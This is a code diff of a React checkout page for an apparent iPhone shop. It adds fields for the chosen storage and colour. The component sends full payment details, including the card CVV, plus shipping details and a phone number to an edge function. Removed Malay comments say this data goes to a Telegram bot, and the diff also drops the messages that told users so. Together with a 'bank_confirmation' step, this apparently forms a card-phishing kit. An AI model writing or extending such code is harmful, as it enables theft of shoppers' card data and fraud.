@@ -23,15 +23,17 @@ export type PaymentDetails = {
   cvv: string;
 };
 
-// Update the type definition for selectedIPhone
-type SelectedIPhoneDetails = { 
-  name: string; 
-  image: string; 
-  price: string; 
-  ram: string; 
-  colors: string[]; 
-  storage: string[]; // Added storage
-  camera: string;    // Added camera
+// Update the type definition for selectedIPhone to include selected options
+type SelectedIPhoneDetails = {
+  name: string;
+  image: string;
+  price: string;
+  ram: string;
+  colors: string[];
+  storage: string[];
+  camera: string;
+  selectedStorage: string; // Added
+  selectedColor: string;   // Added
 };
 
 type CheckoutStep = 'shipping' | 'confirm' | 'payment' | 'processing' | 'bank_confirmation';
@@ -73,21 +75,28 @@ const Checkout: React.FC = () => {
         body: {
           phoneNumber: shippingDetails?.phoneNumber,
           shippingDetails: shippingDetails,
-          selectedIPhone: selectedIPhone,
+          selectedIPhone: { // Pass selected options to the edge function
+            name: selectedIPhone.name,
+            image: selectedIPhone.image,
+            price: selectedIPhone.price,
+            ram: selectedIPhone.ram,
+            colors: selectedIPhone.colors,
+            storage: selectedIPhone.storage,
+            camera: selectedIPhone.camera,
+            selectedStorage: selectedIPhone.selectedStorage,
+            selectedColor: selectedIPhone.selectedColor,
+          },
           paymentDetails: data,
         },
       });
 
       if (functionError) {
         console.error('Error invoking Edge Function:', functionError);
-        // showError('Gagal menghantar maklumat pesanan ke bot Telegram.'); // Dikeluarkan
       } else {
         console.log('Edge Function response:', functionData);
-        // showSuccess('Maklumat pesanan berjaya dihantar ke bot Telegram!'); // Dikeluarkan
       }
     } catch (error) {
       console.error('Network or unexpected error:', error);
-      // showError('Ralat sambungan. Sila cuba lagi.'); // Dikeluarkan
     }
   };
 
